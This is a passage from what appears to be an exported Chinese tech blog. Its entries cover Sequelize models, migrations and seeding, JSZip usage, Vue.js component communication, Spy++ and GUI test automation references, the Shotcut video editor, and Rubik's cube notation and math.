<p>修改models/user.js如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line">module.exports &#x3D; (sequelize, DataTypes) &#x3D;&gt; &#123;</span><br><span class="line">  var User &#x3D; sequelize.define(&#39;User&#39;, &#123;</span><br><span class="line">    firstName: DataTypes.STRING,</span><br><span class="line">    lastName: DataTypes.STRING,</span><br><span class="line">    email: DataTypes.STRING</span><br><span class="line">  &#125;, &#123;&#125;);</span><br><span class="line">  User.associate &#x3D; function(models) &#123;</span><br><span class="line">    &#x2F;&#x2F; associations can be defined here</span><br><span class="line">    User.belongsTo(models.Role, &#123;</span><br><span class="line">            onDelete: &quot;NULL&quot;,</span><br><span class="line">            foreignKey: &#123;</span><br><span class="line">                allowNull: false</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">  &#125;;</span><br><span class="line">  return User;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="修改和运行迁移"><a href="#修改和运行迁移" class="headerlink" title="修改和运行迁移"></a>修改和运行迁移</h2><p>Role和User是一对多的关系，因此需要修改User迁移文件的定义。<br>修改migrates/20180622153152-create-user.js如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  up: (queryInterface, Sequelize) &#x3D;&gt; &#123;</span><br><span class="line">    return queryInterface.createTable(&#39;Users&#39;, &#123;</span><br><span class="line">      id: &#123;</span><br><span class="line">        allowNull: false,</span><br><span class="line">        autoIncrement: true,</span><br><span class="line">        primaryKey: true,</span><br><span class="line">        type: Sequelize.INTEGER</span><br><span class="line">      &#125;,</span><br><span class="line">      roleId: &#123; &#x2F;&#x2F; name of the key we&#39;re adding </span><br><span class="line">          type: Sequelize.INTEGER,</span><br><span class="line">          allowNull: false,</span><br><span class="line">          references: &#123;</span><br><span class="line">              model: &#39;Roles&#39;, &#x2F;&#x2F; name of Target model</span><br><span class="line">              key: &#39;id&#39;, &#x2F;&#x2F; key in Target model that we&#39;re referencing</span><br><span class="line">          &#125;,</span><br><span class="line">          onUpdate: &#39;CASCADE&#39;,</span><br><span class="line">          onDelete: &#39;CASCADE&#39;,</span><br><span class="line">      &#125;,</span><br><span class="line">      firstName: &#123;</span><br><span class="line">        type: Sequelize.STRING</span><br><span class="line">      &#125;,</span><br><span class="line">      lastName: &#123;</span><br><span class="line">        type: Sequelize.STRING</span><br><span class="line">      &#125;,</span><br><span class="line">      email: &#123;</span><br><span class="line">        type: Sequelize.STRING</span><br><span class="line">      &#125;,</span><br><span class="line">      createdAt: &#123;</span><br><span class="line">        allowNull: false,</span><br><span class="line">        type: Sequelize.DATE</span><br><span class="line">      &#125;,</span><br><span class="line">      updatedAt: &#123;</span><br><span class="line">        allowNull: false,</span><br><span class="line">        type: Sequelize.DATE</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  down: (queryInterface, Sequelize) &#x3D;&gt; &#123;</span><br><span class="line">    return queryInterface.dropTable(&#39;Users&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>注意：这里主要给User添加了外键字段，外键字段命名有规则：通常为小写的模型名加Id，即驼峰风格。例如这里加了roleId的外键字段。</strong></p>
<p>直到目前为止，CLI没有将任何东西插入数据库。 刚刚为模型 User和Role创建了必需的模型和迁移文件。 现在要在数据库中实际创建该表，需要运行 db:migrate 命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;node_modules&#x2F;.bin&#x2F;sequelize db:migrate</span><br></pre></td></tr></table></figure>

<p>此命令将执行这些步骤：</p>
<ul>
<li>将在数据库中创建一个名为 SequelizeMeta 的表。 此表用于记录在当前数据库上运行的迁移</li>
<li>开始寻找尚未运行的任何迁移文件。 这可以通过检查 SequelizeMeta 表。 在这个例子中，它将运行创建的 XXXXXXXXXXXXXX-create-role.js和XXXXXXXXXXXXXX-create-user.js 迁移。</li>
<li>创建一个名为 Roles 的表，其中包含其迁移文件中指定的所有列。</li>
<li>创建一个名为 Users 的表，其中包含其迁移文件中指定的所有列。</li>
</ul>
<p>除了使用sequelize db:migrate命令创建数据库表之外，可以使用models同步创建或删除数据库表，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (appConfig.dbCreated &#x3D;&#x3D;&#x3D; false) &#123;</span><br><span class="line">    models.sequelize.sync().then(function() &#123;</span><br><span class="line">        &#x2F;&#x2F;保存应用配置</span><br><span class="line">        appConfig.dbCreated &#x3D; true;</span><br><span class="line">        fs.writeFile(__dirname + &#39;&#x2F;..&#x2F;config&#x2F;appConfig.json&#39;, JSON.stringify(appConfig), function(err) &#123;</span><br><span class="line">            if (err) return console.error(err);</span><br><span class="line">            console.log(&#39;app config save is done&#39;);</span><br><span class="line">        &#125;);</span><br><span class="line">        Promise.all([</span><br><span class="line">          models.T_Role.create(&#123;ID:pwdHash.createMd5(Math.random().toString()),Role_Name:&#39;管理员&#39;&#125;),</span><br><span class="line">          models.T_User.create(&#123;ID:pwdHash.createMd5(Math.random().toString()),Account:appConfig.adminAccount,Password:pwdHash.createHash(appConfig.adminPassword),Audit:true,Avatar:&#39;&#x2F;avatar&#x2F;default.jpg&#39;&#125;),</span><br><span class="line">          models.T_Role.create(&#123;ID:pwdHash.createMd5(Math.random().toString()),Role_Name:&#39;普通用户&#39;&#125;)</span><br><span class="line">          </span><br><span class="line">        ]).then(function (result)&#123;</span><br><span class="line">          &#x2F;&#x2F;console.log(result);</span><br><span class="line">          var role1&#x3D;result[0];</span><br><span class="line">          var user1&#x3D;result[1];</span><br><span class="line">          role1.setT_Users(user1).catch(err&#x3D;&gt;console.log(err));</span><br><span class="line">        &#125;).catch(err&#x3D;&gt;console.log(err));</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        server.listen(port);</span><br><span class="line">        server.on(&#39;error&#39;, onError);</span><br><span class="line">        server.on(&#39;listening&#39;, onListening);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    server.listen(port);</span><br><span class="line">    server.on(&#39;error&#39;, onError);</span><br><span class="line">    server.on(&#39;listening&#39;, onListening);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="创建种子，生成测试数据"><a href="#创建种子，生成测试数据" class="headerlink" title="创建种子，生成测试数据"></a>创建种子，生成测试数据</h2><p>假设我们希望在默认情况下将一些数据插入到几个表中。 例如创建几个用户和角色：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;node_modules&#x2F;.bin&#x2F;sequelize seed:generate --name demo-role</span><br><span class="line">..&#x2F;node_modules&#x2F;.bin&#x2F;sequelize seed:generate --name demo-user</span><br></pre></td></tr></table></figure>
<p>这个命令将会在 seeders 文件夹中创建两个种子文件。文件名看起来像是 XXXXXXXXXXXXXX-demo-role.js和XXXXXXXXXXXXXX-demo-user.js，它遵循相同的 up/down 语义，如迁移文件。</p>
<p>现在我们应该编辑这两个文件，将演示角色插入Role表,将演示用户插入User表。修改XXXXXXXXXXXXXX-demo-role.js如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  up: (queryInterface, Sequelize) &#x3D;&gt; &#123;</span><br><span class="line">      return queryInterface.bulkInsert(&#39;Roles&#39;, [&#123;</span><br><span class="line">        roleName: &#39;管理员&#39;,</span><br><span class="line">        createdAt:new Date(),</span><br><span class="line">        updatedAt:new Date()</span><br><span class="line">      &#125;,&#123;</span><br><span class="line">        roleName: &#39;普通用户&#39;,</span><br><span class="line">        createdAt:new Date(),</span><br><span class="line">        updatedAt:new Date()</span><br><span class="line">      &#125;], &#123;&#125;);</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  down: (queryInterface, Sequelize) &#x3D;&gt; &#123;</span><br><span class="line">      return queryInterface.bulkDelete(&#39;Roles&#39;, null, &#123;&#125;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>修改XXXXXXXXXXXXXX-demo-user.js如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  up: (queryInterface, Sequelize) &#x3D;&gt; &#123;</span><br><span class="line">      return queryInterface.bulkInsert(&#39;Users&#39;, [&#123;</span><br><span class="line">        roleId:1,</span><br><span class="line">        firstName: &#39;John&#39;,</span><br><span class="line">        lastName: &#39;Doe&#39;,</span><br><span class="line">        email: &#39;demo@demo.com&#39;,</span><br><span class="line">        createdAt:new Date(),</span><br><span class="line">        updatedAt:new Date()</span><br><span class="line">      &#125;,&#123;</span><br><span class="line">        roleId:1,</span><br><span class="line">        firstName: &#39;Jack&#39;,</span><br><span class="line">        lastName: &#39;Smith&#39;,</span><br><span class="line">        email: &#39;jack@demo.com&#39;,</span><br><span class="line">        createdAt:new Date(),</span><br><span class="line">        updatedAt:new Date()</span><br><span class="line">      &#125;], &#123;&#125;);</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  down: (queryInterface, Sequelize) &#x3D;&gt; &#123;</span><br><span class="line">      return queryInterface.bulkDelete(&#39;Users&#39;, null, &#123;&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>种子文件修改后，即可使用如下命令将演示数据插入数据库中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;node_modules&#x2F;.bin&#x2F;sequelize db:seed:all</span><br></pre></td></tr></table></figure>

<h1 id="工程实践经验总结"><a href="#工程实践经验总结" class="headerlink" title="工程实践经验总结"></a>工程实践经验总结</h1><p>在工程实践中，只需使用sequelize-cli创建数据库，生成models即可，然后使用代码直接根据models创建数据库表，并生成测试数据。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://docs.sequelizejs.com/" target="_blank" rel="noopener">Sequelize Reference</a>，by sequelizejs.</li>
<li><a href="https://github.com/demopark/sequelize-docs-Zh-CN" target="_blank" rel="noopener">Sequelize 中文文档</a>，by demopark.</li>
<li><a href="https://www.jianshu.com/p/b85cc8a05e53" target="_blank" rel="noopener">解决Mysql中文乱码问题</a>, by 最怕认真.</li>
<li><a href="https://stackoverflow.com/questions/40734263/how-to-set-primary-key-type-to-uuid-via-sequelize-cli" target="_blank" rel="noopener">How to set primary key type to UUID via Sequelize CLI</a>,by stackoverflow.</li>
<li><a href="https://huangwang.github.io/2019/09/20/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E4%B8%BB%E9%94%AE%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95/">数据库表主键设计方法</a>,by jackhuang.</li>
<li><a href="https://sequelize.org/master/variable/index.html#static-variable-DataTypes" target="_blank" rel="noopener">Variable</a>,by sequelize.</li>
<li><a href="https://github.com/sequelize/sequelize/issues/8444" target="_blank" rel="noopener">cascade delete does not work</a>,by sequelize.</li>
<li><a href="https://sebhastian.com/sequelize-foreign-key/" target="_blank" rel="noopener">Adding foreign key to a table using Sequelize</a>,by Nathan Sebhastian.</li>
<li><a href="https://demopark.github.io/sequelize-docs-Zh-CN/advanced-association-concepts/eager-loading.html" target="_blank" rel="noopener">Eager Loading - 预先加载</a>,by demopark.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>jszip使用方法简介</title>
    <url>/2019/12/24/jszip%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>当大文件需要在网络中传输时，最好进行压缩传输，然后在终点进行解压。以ZIP压缩为例，压缩后文件大小极具减小，可节约带宽，提高系统并发能力。下面介绍使用jszip在浏览器端的解压方法。</p>
<h1 id="JSZip简介"><a href="#JSZip简介" class="headerlink" title="JSZip简介"></a>JSZip简介</h1><p>JSZip是一个用于创建、读取和编辑.zip文件的javascript库，有一个可爱而简单的API。JSZip支持Nodejs和浏览器端的安装使用。具体方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">With npm : npm install jszip</span><br><span class="line"></span><br><span class="line">With bower : bower install Stuk&#x2F;jszip</span><br><span class="line"></span><br><span class="line">With component : component install Stuk&#x2F;jszip</span><br><span class="line"></span><br><span class="line">Manually : download JSZip and include the file dist&#x2F;jszip.js or dist&#x2F;jszip.min.js</span><br></pre></td></tr></table></figure>

<h1 id="浏览器端解压zip文件"><a href="#浏览器端解压zip文件" class="headerlink" title="浏览器端解压zip文件"></a>浏览器端解压zip文件</h1><p>后端Nodejs将zip文件以二进制形式存储到数据库中。当前端需要该zip文件时，后端将zip文件以二进制形式传输到前端，前端再解压还原。</p>
<h2 id="Nodejs使用JSZip压缩文件"><a href="#Nodejs使用JSZip压缩文件" class="headerlink" title="Nodejs使用JSZip压缩文件"></a>Nodejs使用JSZip压缩文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var JSZip &#x3D; require(&quot;jszip&quot;);</span><br><span class="line">var zip &#x3D; new JSZip();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; create a file</span><br><span class="line">zip.file(&quot;hello.txt&quot;, &quot;Hello[p my)6cxsw2q&quot;);</span><br><span class="line">&#x2F;&#x2F; oops, cat on keyboard. Fixing !</span><br><span class="line">zip.file(&quot;hello.txt&quot;, &quot;Hello World\n&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; create a file and a folder</span><br><span class="line">zip.file(&quot;nested&#x2F;hello.txt&quot;, &quot;Hello World\n&quot;);</span><br><span class="line">&#x2F;&#x2F; same as</span><br><span class="line">zip.folder(&quot;nested&quot;).file(&quot;hello.txt&quot;, &quot;Hello World\n&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="浏览器端解压Zip文件"><a href="#浏览器端解压Zip文件" class="headerlink" title="浏览器端解压Zip文件"></a>浏览器端解压Zip文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import JSZip from &#39;jszip&#39;</span><br><span class="line"></span><br><span class="line">let new_zip &#x3D; new JSZip();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Read zip package</span><br><span class="line">new_zip.loadAsync(content)</span><br><span class="line">.then(function(zip) &#123;</span><br><span class="line">    &#x2F;&#x2F; you now have every files contained in the loaded zip</span><br><span class="line">    new_zip.file(&quot;hello.txt&quot;).async(&quot;string&quot;); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/ZIP%E6%A0%BC%E5%BC%8F" target="_blank" rel="noopener">ZIP格式</a>,by wikipedia.</li>
<li><a href="https://catdeacon.com/note/679.html" target="_blank" rel="noopener">gzip,bzip2,zip三种格式压缩率对比</a>,by CatDeacon.</li>
<li><a href="https://stuk.github.io/jszip/" target="_blank" rel="noopener">JSZip</a>,by stuk.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>spy++简介</title>
    <url>/2021/11/12/spyxx%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>开发某些自动化工具，第一步就是要获取目标窗口的句柄，然后通过该窗口句柄向该窗口发送消息，以实现自动输入等功能。而获取窗口句柄必然离不开Spy++工具。</p>
<h1 id="GUI自动测试"><a href="#GUI自动测试" class="headerlink" title="GUI自动测试"></a>GUI自动测试</h1><h1 id="HTML5-Canvas自动测试"><a href="#HTML5-Canvas自动测试" class="headerlink" title="HTML5 Canvas自动测试"></a>HTML5 Canvas自动测试</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/wyplj2015/article/details/107271514" target="_blank" rel="noopener">Windows上spy++的安装和使用</a>,by wyplj_sir.</li>
<li><a href="https://www.cnblogs.com/zjutlitao/p/3889900.html" target="_blank" rel="noopener">[WinAPI] 获取窗口句柄的几种方法</a>,by beautifulzzzz.</li>
<li><a href="https://www.cnblogs.com/mq0036/p/12575627.html" target="_blank" rel="noopener">c# 获取当前活动窗口句柄,获取窗口大小及位置</a>,by jack_孟.</li>
<li><a href="https://blog.csdn.net/AiFengipeng/article/details/112758075" target="_blank" rel="noopener">通过获取窗口句柄模拟键鼠点击的一些方法</a>,by unbalance_.</li>
<li><a href="https://stackoverflow.com/questions/28789969/why-do-some-windows-not-receive-windows-messages" target="_blank" rel="noopener">Why do some windows not receive Windows messages</a>,by stackoverflow.</li>
<li><a href="https://stackoverflow.com/questions/4088368/spy-alternative-that-can-send-messages" target="_blank" rel="noopener">Spy++ alternative that can send messages</a>,by stackoverflow.</li>
<li><a href="https://www.zhihu.com/question/20224354" target="_blank" rel="noopener">哪些事情是 AutoIt 可以而 AutoHotkey 不行的？</a>,by zhihu.</li>
<li><a href="https://www.cnblogs.com/zoulongbin/p/8305162.html" target="_blank" rel="noopener">AutoIt 软件自动化操作</a>,by 邹龙彬.</li>
<li><a href="https://testerhome.com/topics/19006" target="_blank" rel="noopener">游戏测试 游戏自动化测试三三二二</a>,by IAmTester.</li>
<li><a href="https://airtest.doc.io.netease.com/tutorial/0_automated_testing/" target="_blank" rel="noopener">序、自动化测试概述</a>,by Airtest Project Docs.</li>
<li><a href="https://juejin.cn/post/6844904006762889229" target="_blank" rel="noopener">Selenium详解</a>,by 闲欢.</li>
<li><a href="https://juejin.cn/post/6888209975965909000" target="_blank" rel="noopener">canvas进阶——如何实现canvas的事件系统</a>,by 我的蓝猫被削了.</li>
<li><a href="https://zhuanlan.zhihu.com/p/400480624" target="_blank" rel="noopener">CANVAS 实现事件系统</a>,by 阿飞.</li>
<li><a href="https://zhangwang1990.gitbooks.io/canvas-in-deeps/content/canvasde-gao-ji-hui-zhi-ji-qiao-ji-shi-jian.html" target="_blank" rel="noopener">Canvas的高级绘制技巧和事件系统</a>,by Canvas in deeps.</li>
<li><a href="https://www.cnblogs.com/silmerusse/p/3201037.html" target="_blank" rel="noopener">使用Selenium和openCV对HTML5 canvas游戏进行自动化功能测试（一）</a>,by silmerusse.</li>
<li><a href="https://zhuanlan.zhihu.com/p/38085152" target="_blank" rel="noopener">用 Selenium + OpenCV 来玩 HTML5 小游戏</a>,by 郑恒.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>vuejs组件间通信的方法</title>
    <url>/2019/09/02/vuejs%E7%BB%84%E4%BB%B6%E9%97%B4%E9%80%9A%E4%BF%A1%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Vuejs一个吸引人的地方是可以进行组件化开发，避免了前端开发的无序状态。组件无法单独工作，必然会跟父子组件或兄弟组件之间进行通信，以合作实现某种功能。下面即简单介绍Vuejs组件之间的各种通信方式。</p>
<h1 id="方法一、props-emit"><a href="#方法一、props-emit" class="headerlink" title="方法一、props/$emit"></a>方法一、props/$emit</h1><ul>
<li>父组件向子组件传值</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 父组件中</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;section&quot;&gt;</span><br><span class="line">    &lt;com-article :articles&#x3D;&quot;articleList&quot; @onEmitIndex&#x3D;&quot;onEmitIndex&quot;&gt;&lt;&#x2F;com-article&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;currentIndex&#125;&#125;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import comArticle from &#39;.&#x2F;test&#x2F;article.vue&#39;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;HelloWorld&#39;,</span><br><span class="line">  components: &#123; comArticle &#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      currentIndex: -1,</span><br><span class="line">      articleList: [&#39;红楼梦&#39;, &#39;西游记&#39;, &#39;三国演义&#39;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    onEmitIndex(idx) &#123;</span><br><span class="line">      this.currentIndex &#x3D; idx</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>子组件向父组件传值</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;div v-for&#x3D;&quot;(item, index) in articles&quot; :key&#x3D;&quot;index&quot; @click&#x3D;&quot;emitIndex(index)&quot;&gt;&#123;&#123;item&#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  props: [&#39;articles&#39;],</span><br><span class="line">  methods: &#123;</span><br><span class="line">    emitIndex(index) &#123;</span><br><span class="line">      this.$emit(&#39;onEmitIndex&#39;, index)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="方法二、-emit-on"><a href="#方法二、-emit-on" class="headerlink" title="方法二、$emit/$on"></a>方法二、$emit/$on</h1><h1 id="方法三、vuex"><a href="#方法三、vuex" class="headerlink" title="方法三、vuex"></a>方法三、vuex</h1><h1 id="方法四、-attrs-listeners"><a href="#方法四、-attrs-listeners" class="headerlink" title="方法四、$attrs/$listeners"></a>方法四、$attrs/$listeners</h1><h1 id="方法五、provide-inject"><a href="#方法五、provide-inject" class="headerlink" title="方法五、provide/inject"></a>方法五、provide/inject</h1><blockquote>
<p>Vue2.2.0新增API,这对选项需要一起使用，以允许一个祖先组件向其所有子孙后代注入一个依赖，不论组件层次有多深，并在起上下游关系成立的时间里始终生效。一言而蔽之：祖先组件中通过provider来提供变量，然后在子孙组件中通过inject来注入变量。<br>provide / inject API 主要解决了跨级组件间的通信问题，不过它的使用场景，主要是子组件获取上级组件的状态，跨级组件间建立了一种主动提供与依赖注入的关系。</p>
</blockquote>
<blockquote>
<p>需要注意的是：provide 和 inject 绑定并不是可响应的。这是刻意为之的。然而，如果你传入了一个可监听的对象，那么其对象的属性还是可响应的。</p>
</blockquote>
<blockquote>
<p>虽说provide 和 inject 主要为高阶插件/组件库提供用例，但如果你能在业务中熟练运用，可以达到事半功倍的效果！</p>
</blockquote>
<h1 id="方法六、-parent-children与-ref"><a href="#方法六、-parent-children与-ref" class="headerlink" title="方法六、$parent / $children与 ref"></a>方法六、$parent / $children与 ref</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.im/post/5cde0b43f265da03867e78d3" target="_blank" rel="noopener">Vue 组件间通信六种方式（完整版）</a>,by 浪里行舟.</li>
<li><a href="https://nlrx-wjc.github.io/Learn-Vue-Source-Code/" target="_blank" rel="noopener">逐行剖析 Vue.js 源码</a>,by 难凉热血.</li>
<li><a href="https://juejin.cn/post/6844903887162310669" target="_blank" rel="noopener">Vue 组件间通信的八种方式</a>,by ikoala.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>三分线构图方法</title>
    <url>/2022/10/28/%E4%B8%89%E5%88%86%E7%BA%BF%E6%9E%84%E5%9B%BE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/ecae508991a0" target="_blank" rel="noopener">三分线构图，7种玩法，简单拍出美！</a>,by 手机摄影构图大全.</li>
<li><a href="https://zhuanlan.zhihu.com/p/41770653" target="_blank" rel="noopener">常用的摄影构图之三分线</a>,by 慢热氧气.</li>
<li><a href="https://www.woshipm.com/pd/809116.html" target="_blank" rel="noopener">设计理论：如何使登录页更完美与高效？</a>,by Lainey.</li>
<li><a href="https://blog.csdn.net/m0_71814235/article/details/126340703" target="_blank" rel="noopener">ps制作设计网站登录界面</a>,by 正在修炼web的小芮.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>shotcut视频编辑软件使用帮助</title>
    <url>/2021/12/06/shotcut%E8%A7%86%E9%A2%91%E7%BC%96%E8%BE%91%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>最近有个视频剪辑的需求，以前用过会声会影，但感觉它安装包太大了。用了一下爱剪辑，发现该软件确实比较易用，但各种功能限制较多，广告太多，充值的坑太多。最后还是选择了开源的shotcut，基本也能满足简单的视频编辑要求。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/38419089" target="_blank" rel="noopener">Shotcut视频剪辑软件使用</a>,by 清风草原.</li>
<li><a href="https://blog.csdn.net/lggirls/article/details/108580713" target="_blank" rel="noopener">开源视频处理工具Shotcut的用法： 剪切、合并、增加背景音乐、添加字幕、 插入视频、图片转视频并加背景音乐、制作电子相册</a>,by lggirls.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
      </tags>
  </entry>
  <entry>
    <title>三阶魔方复原方法简介</title>
    <url>/2019/11/30/%E4%B8%89%E9%98%B6%E9%AD%94%E6%96%B9%E5%A4%8D%E5%8E%9F%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>魔方作为家喻户晓的益智玩具，由匈牙利建筑学教授暨雕塑家鲁比克·艾尔内于1974年发明，最初的名称叫Magic Cube[2]，1980年Ideal Toys公司于贩售此玩具，并将名称改为Rubik’s Cube。下面简要介绍魔方复原的方法。</p>
<h1 id="魔方公式书写方式"><a href="#魔方公式书写方式" class="headerlink" title="魔方公式书写方式"></a>魔方公式书写方式</h1><p>为了记录下复原、转乱的过程或公式的步骤，会用Singmaster符号来书写（由David Singmaster发明）。书写方式如下：</p>
<ul>
<li>R(Right)、L(Left)、U(Up)、D(Down)、F(Front)、B(Back)分别代表右、左、上、下、前、后层。</li>
<li>若是顺时针旋转，则直接写上符号；若是逆时针旋转，则在符号后加上“’”或是“i”；若是旋转180°，则在符号后加上“2”或是“²”。</li>
</ul>
<h1 id="魔方数学方程式"><a href="#魔方数学方程式" class="headerlink" title="魔方数学方程式"></a>魔方数学方程式</h1><h2 id="变化数"><a href="#变化数" class="headerlink" title="变化数"></a>变化数</h2><p>三阶魔方的总变化数是：</p>
<p>$${\displaystyle {\frac {8!\times 3^{8}\times 12!\times 2^{12}}{2\times 2\times 3}}=43,!252,!003,!274,!489,!856,!000\approx 4.33\times 10^{19}}$$</p>
<p>三阶魔方总变化数的算式是这样得来：</p>
<ul>
<li><p>8个角块可以互换位置（${\displaystyle 8!}$），也可以旋转（3），但不能单独旋转一个角块，所以总共有${\displaystyle {\frac {8!\times 3^{8}}{3}}}$种变化状态。</p>
</li>
<li><p>12个边块可以互换位置（$12!$)，也可以翻转（2），但不能单独翻转一个边块（将两个面对调），也不能单独交换两边块，所以总共有${\displaystyle {\frac {12!\times 2^{12}}{2\times 2}}}$种变化状态。</p>
</li>
</ul>
<h2 id="上帝的数字"><a href="#上帝的数字" class="headerlink" title="上帝的数字"></a>上帝的数字</h2><p>所有的三阶魔方都可以在有限步数内复原，1982年，佛雷与辛马斯特合著的《魔方手册》定义任意的三阶魔方都可以保证最少n步复原，并称呼n为上帝的数字。在此书中，证明上帝的数字介于17~52之间。</p>
<p>1995年，瑞德证明上帝的数字介于20-29之间。2006年，雷杜用群论证明上界可改进为27。</p>
<p>2007年，计算机科学家古柏曼与他的学生用20台超级电脑花了8000个小时证明上界可改进为26。</p>
<p>2008年，Tomas Rokicki宣布证明了任何魔方可以在25步以内解开[22]。之后又改进为22步。</p>
<p>2010年，包括Tomas Rokicki和Morley Davidson等人的研究团队证明任意组合的魔方可以在20步内还原，现在上帝的数字正式定为20。</p>
<h1 id="魔方复原方法"><a href="#魔方复原方法" class="headerlink" title="魔方复原方法"></a>魔方复原方法</h1><p>以白色面为例，说明魔方复原的简单方法。</p>
<h2 id="第一步白色面的复原"><a href="#第一步白色面的复原" class="headerlink" title="第一步白色面的复原"></a>第一步白色面的复原</h2><p>第一步白色面的复原非常简单，分成两小步，如图1和图2所示。</p>
<p align="center">
    <img src="images/good-white-cross.svg" width="40%" alt="解决白色边缘"/>
</p>
<center>图1 解决白色边缘</center>
<p align="center">
    <img src="images/solved-first-white-face.svg" width="40%" alt="解决白色角落"/>
</p>
<center>图2 解决白色角落</center>

<p>白色面的还原比较简单，就不介绍具体步骤了。</p>
